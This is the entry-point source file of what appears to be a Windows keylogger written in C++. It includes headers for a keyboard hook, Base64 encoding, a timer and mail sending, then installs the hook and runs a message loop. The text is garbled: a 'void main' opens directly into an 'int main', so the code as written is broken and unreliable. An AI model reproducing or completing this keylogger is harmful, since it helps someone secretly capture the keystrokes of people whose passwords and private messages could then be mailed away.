#include <iostream>
#include <windows.h>
#include "KeyConstants.h"
#include "Helper.h"
#include "Base64.h"//used for encoding and decoding
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"

using namespace std;


void main(){

int main(){

    MSG Msg;
    IO::MKDir(IO::GetOurPath(true));

    InstallHook();
    while(GetMessageA(&Msg, NULL, 0, 0)){
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();
}
